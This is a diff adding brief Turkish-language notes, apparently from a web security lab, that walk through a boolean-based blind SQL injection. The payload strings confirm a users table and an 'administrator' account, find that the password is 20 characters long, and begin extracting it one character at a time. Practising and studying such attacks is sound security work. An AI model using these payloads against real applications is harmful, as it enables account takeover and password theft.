@@ -1,0 +1,24 @@
+' AND '1'='2
+hatalıysa değer yok
+
+
+
+' AND '1'='1
+doğruysa değer var
+
+
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+bana user tablosunda bir kayıt en az olduğunu söyledi.
+
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+administrator adında bir kayıt var.
+
+
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+bizim şifremiz 20 karekter
+
+
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+
+sspk
